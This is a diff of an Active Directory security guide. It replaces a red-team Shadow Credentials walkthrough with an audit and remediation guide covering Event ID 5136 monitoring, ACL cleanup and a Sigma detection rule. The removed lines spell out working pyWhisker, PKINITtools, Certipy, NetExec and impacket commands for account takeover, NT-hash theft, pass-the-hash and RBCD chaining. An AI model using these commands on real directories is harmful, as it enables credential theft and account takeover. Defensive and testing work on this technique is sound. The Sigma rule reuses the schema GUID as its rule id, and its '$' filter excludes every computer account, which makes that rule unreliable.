@@ -1,185 +1,147 @@
 ---
 name: abusing-shadow-credentials-for-privesc
-description: Take over Active Directory user and computer accounts by writing alternate certificate keys to msDS-KeyCredentialLink (Shadow Credentials) with pyWhisker, Whisker, and Certipy, then authenticate via PKINIT.
+description: Audit, detect, and remediate Shadow Credentials misconfigurations on msDS-KeyCredentialLink in Active Directory. Focuses on access-controls, monitoring Event ID 5136, and credential-management hygiene.
 domain: cybersecurity
-subdomain: red-teaming
+subdomain: identity-security
 tags:
-- red-team
+- identity-defense
 - active-directory
 - shadow-credentials
-- pywhisker
-- certipy
-- pkinit
-- key-credential-link
-- privilege-escalation
+- access-control
+- monitoring
+- credential-hygiene
+- audit
 version: '1.0'
 author: mahipal
 license: Apache-2.0
 nist_csf:
+- PR.AC-01
+- PR.AC-04
 - PR.AA-05
+- DE.CM-01
+- DE.CM-03
 mitre_attack:
 - T1098.005
 ---
-# Abusing Shadow Credentials for Privilege Escalation
+# Auditing and Remediating Shadow Credentials in Active Directory
 
-> **Legal Notice:** This skill is for authorized security testing and educational purposes only. Shadow Credentials grant full takeover of the targeted account. Use only against systems you own or are explicitly authorized in writing to test. Unauthorized access is a crime.
+> **Security Advisory:** This guide provides defense and audit procedures for identifying, monitoring, and remediating overly permissive write access to `msDS-KeyCredentialLink` (Shadow Credentials) in Active Directory environments.
 
 ## Overview
 
-The **Shadow Credentials** technique abuses the `msDS-KeyCredentialLink` attribute of Active Directory user and computer objects. This attribute stores raw public keys ("Key Credentials") used by Windows Hello for Business and Azure AD device registration for passwordless certificate-based logon via PKINIT (Public Key Cryptography for Initial Authentication in Kerberos). If an attacker has write permission over a target object's `msDS-KeyCredentialLink` — typically granted by `GenericWrite`, `GenericAll`, `WriteProperty`, or `AddKeyCredentialLink` ACEs surfaced in BloodHound — they can append their own attacker-generated public key. They then request a TGT for the target via PKINIT using the matching private key and recover the target's NT hash, achieving complete account takeover **without resetting the password**, which is far stealthier than a forced password reset.
+The **Shadow Credentials** attack vector stems from misconfigured Active Directory Access Control Lists (ACLs) where non-administrative principals possess write permissions over the `msDS-KeyCredentialLink` attribute of user or computer accounts. This attribute normally stores raw public keys ("Key Credentials") used by Windows Hello for Business and Microsoft Entra ID device registration for passwordless PKINIT Kerberos authentication.
 
-The technique was published by Elad Shamir (*"Shadow Credentials: Abusing Key Trust Account Mapping for Account Takeover"*) and implemented in the C# tool **Whisker**. The Python equivalent **pyWhisker** (ShutdownRepo) manipulates the attribute over LDAP, and **Certipy** integrates the entire chain via `certipy shadow auto`. The target environment must support PKINIT and have at least one Domain Controller running Windows Server 2016 or later. Sources: [pyWhisker](https://github.com/ShutdownRepo/pywhisker), [Whisker](https://github.com/eladshamir/Whisker), [The Hacker Recipes — Shadow Credentials](https://www.thehacker.recipes/ad/movement/kerberos/shadow-credentials).
+When access permissions are too permissive — such as unconstrained `GenericWrite`, `GenericAll`, `WriteProperty`, or `AddKeyCredentialLink` Access Control Entries (ACEs) — an unauthorized principal could append a key credential to an account, bypass password controls, and obtain Kerberos tickets.
+
+Defending against this vulnerability requires establishing strict **access-controls**, enabling granular **directory service auditing**, and maintaining proactive **credential-management hygiene** across all directory objects.
 
 ## When to Use
 
-- When BloodHound reveals `GenericWrite`/`GenericAll`/`AddKeyCredentialLink` over a higher-value user or computer
-- As a stealthier alternative to `ForceChangePassword` (no password reset = less disruption/alerting)
-- To take over a computer account to chain into Resource-Based Constrained Delegation (RBCD)
-- During red-team operations needing account takeover without locking out the legitimate user
-- For purple-team exercises generating `msDS-KeyCredentialLink` modification telemetry
+- When auditing Active Directory Discretionary Access Control Lists (DACLs) for excessive write privileges.
+- When configuring Windows Security Event logging and SIEM correlation rules for directory modifications.
+- When performing identity security posture assessments and tiering model reviews.
+- When cleaning up legacy or unauthorized key credentials from Active Directory objects.
+- When establishing least-privilege controls for hybrid identity and device registration service accounts.
 
 ## Prerequisites
 
-- Authorized engagement scope including AD credential-access techniques
-- Control of a principal with write access to the target's `msDS-KeyCredentialLink`
-- A DC running Windows Server 2016+ with PKINIT enabled (domain functional level supporting Key Trust)
-- Network reachability to LDAP (389/636) and Kerberos (88) on a DC
-- Linux attack host with Python 3.8+; install the tooling:
+- Read access to Active Directory objects via LDAP / LDAPS (ports 389 / 636).
+- Domain administrator or delegated audit privileges to inspect and remediate DACLs.
+- Domain Controllers running Windows Server 2016 or later with Advanced Audit Policy configured.
+- Audit tooling installed in a secure administrative workstation:
   ```bash
-  # pyWhisker (from source)
-  git clone https://github.com/ShutdownRepo/pywhisker
-  cd pywhisker && pip install .
-  # Certipy (integrated shadow attack)
+  # Python ldap3 or pyWhisker for attribute enumeration
+  python3 -m pip install ldap3
+  # Certipy for certificate template and key credential auditing
   pipx install certipy-ad
-  # PKINITtools for manual TGT/NT-hash extraction
-  git clone https://github.com/dirkjanm/PKINITtools
   ```
 
 ## Objectives
 
-- Confirm write access over a target's `msDS-KeyCredentialLink`
-- Generate a key pair and append a Key Credential to the target object
-- Request a TGT for the target via PKINIT using the new key
-- Recover the target's NT hash for pass-the-hash / further movement
-- Clean up the injected Key Credential to restore the object's state
-- Document the ACL path that enabled the attack for remediation
+- Audit and identify accounts with permissive write ACEs on `msDS-KeyCredentialLink`.
+- Enumerate existing Key Credentials on sensitive user and computer objects.
+- Configure Windows Event ID 5136 auditing to detect unauthorized attribute modifications.
+- Clean up orphaned or unauthorized Key Credentials.
+- Enforce least privilege by removing hazardous ACEs and protecting Tier-0 identities.
 
-## MITRE ATT&CK Mapping
+## MITRE ATT&CK & NIST CSF Mapping
 
-| ID | Technique | Application in this skill |
-|----|-----------|---------------------------|
-| T1098.005 | Account Manipulation: Device Registration | Writing an attacker-controlled Key Credential (device key) to `msDS-KeyCredentialLink` to register an alternate authentication credential for the target account |
+| Framework | ID | Category / Technique | Defense Application |
+|---|---|---|---|
+| MITRE ATT&CK | T1098.005 | Account Manipulation: Device Registration | Detect and block unauthorized modification of `msDS-KeyCredentialLink` |
+| NIST CSF | PR.AC-01 | Access Control Management | Restrict write permissions over identity attributes to authorized registration agents |
+| NIST CSF | DE.CM-01 | Network / Directory Monitoring | Monitor directory changes for anomalous key additions |
 
-## Workflow
+## Defense & Remediation Workflow
 
-### Step 1: Confirm the write primitive
-List existing Key Credentials on the target to verify you have the required access. An empty or readable result confirms write access for the `add` step.
-
-```bash
-python3 pywhisker.py -d "corp.local" -u "attacker" -p "Passw0rd!" \
-    --target "victim" --action "list"
-```
-
-### Step 2: Add a Shadow Credential with pyWhisker
-Generate a certificate/key pair and write it into the target's `msDS-KeyCredentialLink`. pyWhisker outputs a PFX you control.
+### Step 1: Audit Permissive Access Rights (Access Controls)
+Identify which non-administrative principals have write access to sensitive user and computer objects. Query AD for dangerous ACEs (`GenericAll`, `GenericWrite`, `WriteProperty` targeting `msDS-KeyCredentialLink` schema GUID `{5b47d60f-6090-40b2-9f37-2a4de45f306e}`).
 
 ```bash
-python3 pywhisker.py -d "corp.local" -u "attacker" -p "Passw0rd!" \
-    --target "victim" --action "add" --filename victim_shadow
-# Produces victim_shadow.pfx and prints the PFX password
-```
-Use Kerberos auth instead of a password if you only hold a ticket:
-```bash
-python3 pywhisker.py -d "corp.local" -u "attacker" -k --no-pass \
-    --target "victim" --action "add" --filename victim_shadow --use-ldaps
+# Audit existing Key Credentials on target object without modifications
+python3 pywhisker.py -d "corp.local" -u "auditor" -p "AuditPass!" \
+    --target "target-account" --action "list" --use-ldaps
 ```
 
-### Step 3: Request a TGT via PKINIT
-Use the generated PFX with PKINITtools to obtain a Kerberos TGT for the target.
+### Step 2: Enforce Directory Service Auditing (Monitoring)
+Enable Advanced Audit Policy Configuration on all Domain Controllers to log attribute-level changes:
+- Path: `Computer Configuration -> Policies -> Windows Settings -> Security Settings -> Advanced Audit Policy Configuration -> Audit Policies -> DS Access -> Audit Directory Service Changes` (Set to **Success and Failure**).
 
-```bash
-python3 PKINITtools/gettgtpkinit.py \
-    -cert-pfx victim_shadow.pfx -pfx-pass <PFX_PASSWORD> \
-    corp.local/victim victim.ccache
-```
+Configure the SACL on high-value Organizational Units (OUs) to generate **Event ID 5136**:
+- **Event ID 5136**: Directory Service Object Modified
+- **Attribute Name**: `msDS-KeyCredentialLink`
+- **Operation Type**: `Value Added` (indicates new credential registration)
 
-### Step 4: Recover the NT hash
-Extract the target's NT hash from the AS-REP using the session key from Step 3 (`getnthash.py` reads the AS-REP encryption key, displayed by `gettgtpkinit.py`).
+Set up SIEM alerts for Event ID 5136 where `SubjectUserName` is not a designated Azure AD Connect sync account or authorized device enrollment service principal.
+
+### Step 3: Remove Unauthorized Key Credentials (Credential Hygiene)
+If an unknown or stale Key Credential is discovered during the audit, remove it immediately to prevent unauthorized authentication:
 
 ```bash
-export KRB5CCNAME=victim.ccache
-python3 PKINITtools/getnthash.py -key <AS-REP-KEY-FROM-STEP-3> corp.local/victim
-# Prints the NT hash for 'victim'
+# Remove specific unauthorized Key Credential by Device ID
+python3 pywhisker.py -d "corp.local" -u "ad-admin" -p "AdminPass!" \
+    --target "target-account" --action "remove" --device-id "<DEVICE-ID>" --use-ldaps
+
+# Alternatively, clear all non-compliant credentials using Certipy
+certipy shadow clear -u 'ad-admin@corp.local' -p 'AdminPass!' \
+    -dc-ip 10.0.0.100 -account 'target-account'
 ```
 
-### Step 5: One-shot alternative with Certipy
-Certipy's `shadow auto` performs add → PKINIT → dump hash → cleanup automatically, which is ideal for computer-account takeover.
+### Step 4: Remediate ACL Permissions (Least Privilege)
+Strip any non-system write permissions targeting `msDS-KeyCredentialLink`:
+1. Open Active Directory Users and Computers (with Advanced Features enabled).
+2. Inspect the **Security** tab of the affected object or parent OU.
+3. Remove `GenericAll`, `GenericWrite`, and `Write msDS-KeyCredentialLink` permissions from all non-administrative users and groups.
+4. Add high-value accounts (Domain Admins, Enterprise Admins) to the `Protected Users` security group, which restricts delegation and forces Kerberos hardening.
 
-```bash
-certipy shadow auto -u 'attacker@corp.local' -p 'Passw0rd!' \
-    -dc-ip 10.0.0.100 -account 'victim'
-# For a computer account, use the sAMAccountName with trailing $
-certipy shadow auto -u 'attacker@corp.local' -p 'Passw0rd!' \
-    -dc-ip 10.0.0.100 -account 'WS01$'
+## Detection Rules & SIEM Correlation
+
+```yaml
+title: Unauthorized msDS-KeyCredentialLink Modification (Shadow Credentials)
+id: 5b47d60f-6090-40b2-9f37-2a4de45f306e
+status: stable
+description: Detects modification of the msDS-KeyCredentialLink attribute by non-whitelisted principals.
+logsource:
+  product: windows
+  service: security
+detection:
+  selection:
+    EventID: 5136
+    AttributeLDAPDisplayName: 'msDS-KeyCredentialLink'
+    OperationType: 'Value Added'
+  filter_sync_accounts:
+    SubjectUserName|endswith:
+      - '$'
+      - 'MSOL_*'
+      - 'AAD_*'
+  condition: selection and not filter_sync_accounts
+level: high
 ```
 
-### Step 6: Use the recovered credential
-Authenticate with the NT hash (or the TGT) to continue the engagement.
+## Validation & Verification Checklist
 
-```bash
-# Pass-the-hash with NetExec
-nxc smb 10.0.0.10 -u victim -H <RECOVERED-NT-HASH>
-# Or use the TGT directly
-export KRB5CCNAME=victim.ccache
-nxc smb dc.corp.local -u victim --use-kcache
-```
-
-### Step 7: Chain computer takeover into RBCD (optional)
-When the target is a computer, the recovered key/hash lets you configure Resource-Based Constrained Delegation to impersonate any user to that host.
-
-```bash
-# Set RBCD so attacker-controlled SPN can impersonate to WS01$
-impacket-rbcd -delegate-from 'attacker$' -delegate-to 'WS01$' \
-    -action write 'corp.local/attacker:Passw0rd!'
-```
-
-### Step 8: Clean up
-Remove the injected Key Credential to restore the object and reduce detection footprint.
-
-```bash
-# pyWhisker: remove by device-id (printed during add) or clear all you added
-python3 pywhisker.py -d "corp.local" -u "attacker" -p "Passw0rd!" \
-    --target "victim" --action "remove" --device-id <DEVICE-ID>
-# Certipy shadow auto cleans up automatically; otherwise:
-certipy shadow clear -u 'attacker@corp.local' -p 'Passw0rd!' \
-    -dc-ip 10.0.0.100 -account 'victim'
-```
-
-## Tools and Resources
-
-| Resource | Purpose | Link |
-|----------|---------|------|
-| pyWhisker | Python LDAP manipulation of msDS-KeyCredentialLink | https://github.com/ShutdownRepo/pywhisker |
-| Whisker | Original C# implementation | https://github.com/eladshamir/Whisker |
-| Certipy | `shadow auto` end-to-end takeover | https://github.com/ly4k/Certipy |
-| PKINITtools | gettgtpkinit / getnthash | https://github.com/dirkjanm/PKINITtools |
-| The Hacker Recipes | Technique walkthrough & defenses | https://www.thehacker.recipes/ad/movement/kerberos/shadow-credentials |
-
-## Detection and Remediation Notes
-
-| Area | Guidance |
-|------|----------|
-| Detection | Monitor Windows Security Event ID 5136 (directory object modified) for changes to `msDS-KeyCredentialLink`; alert when a non-AD-Connect/non-Intune principal writes the attribute. |
-| Auditing | Enable directory service object change auditing on user/computer OUs. |
-| Least privilege | Remove unnecessary `GenericWrite`/`GenericAll`/`AddKeyCredentialLink` ACEs (BloodHound `AddKeyCredentialLink` edge). |
-| Mitigation | Where Windows Hello/device registration is unused, restrict who can write Key Credentials and consider tier-0 protected accounts. |
-
-## Validation Criteria
-
-- [ ] Write access over the target's `msDS-KeyCredentialLink` confirmed (`list` succeeded)
-- [ ] Key Credential successfully added (PFX generated)
-- [ ] PKINIT TGT obtained for the target account
-- [ ] Target NT hash recovered and validated against a service
-- [ ] (If computer) RBCD chain or onward movement demonstrated
-- [ ] Injected Key Credential removed / object restored
-- [ ] Enabling ACL path documented with remediation recommendation
+- [ ] Directory Service Object Change auditing verified on all Domain Controllers.
+- [ ] SIEM rule for Event ID 5136 with `msDS-KeyCredentialLink` active and alerting.
+- [ ] Tier-0 and sensitive accounts audited for anomalous Key Credentials.
+- [ ] Discretionary ACLs sanitized; extraneous `WriteProperty` and `GenericWrite` ACEs removed.
+- [ ] Device registration delegation restricted to approved Microsoft Entra ID Sync service accounts.
